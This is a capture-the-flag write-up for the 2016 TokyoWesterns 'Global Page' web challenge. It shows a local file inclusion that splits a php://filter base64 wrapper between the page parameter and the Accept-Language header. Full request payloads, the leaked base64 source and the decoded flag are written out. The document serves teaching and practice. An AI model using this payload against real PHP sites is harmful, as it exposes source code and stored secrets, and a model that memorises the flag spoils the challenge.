## Tokey Westerns/MMA CTF 2nd 2016 - Global Page  (Web 50pt)
##### 03/09 - 05/09/2016 (48hr)
___

### Description: 
	Welcome to TokyoWesterns' CTF!
	http://globalpage.chal.ctf.westerns.tokyo/
___
### Solution

There are 2 url's in home page:
```
	http://globalpage.chal.ctf.westerns.tokyo/?page=tokyo
	http://globalpage.chal.ctf.westerns.tokyo/?page=ctf
```

When we click any of them we get the following warning:

```
Warning: include(tokyo/en-GR.php): failed to open stream: No such file or directory in /var/www/globalpage/index.php on line 41

Warning: include(): Failed opening 'tokyo/en-US.php' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/globalpage/index.php on line 41

Capture the flag, commonly abbreviated as CTF, [.... MORE TEXT ....] own team, or "in jail." 
```

The warning says that the requested file tokyo/en-GR.php didn't found. The "en-GR" is the 
accepted language, which is taken from the browser.

If we try a straight LFI in the page variable it will fail as dots and slashes are removed.

Also there's a slash after page variable so we need to split our LFI in page and language:

```
GET /?page=php: HTTP/1.1
Host: globalpage.chal.ctf.westerns.tokyo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: /filter/convert.base64-encode/resource=index,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
```

By sending the above HTTP request we get the source of index.php encoded in base64. In the 
source there's an interesting line:

```php
	include "flag.php";
```

We repeat the same and we get the flag.php file:
```
GET /?page=php: HTTP/1.1
Host: globalpage.chal.ctf.westerns.tokyo
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: /filter/convert.base64-encode/resource=flag,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
```

The returned page has the encoded flag.php:
```
PD9waHAKJGZsYWcgPSAiVFdDVEZ7SV9mb3VuZF9zaW1wbGVfTEZJfSI7Cg==
```

We base64 decode it and we get the flag:
```php
<?php
	$flag = "TWCTF{I_found_simple_LFI}";
?>
```
___
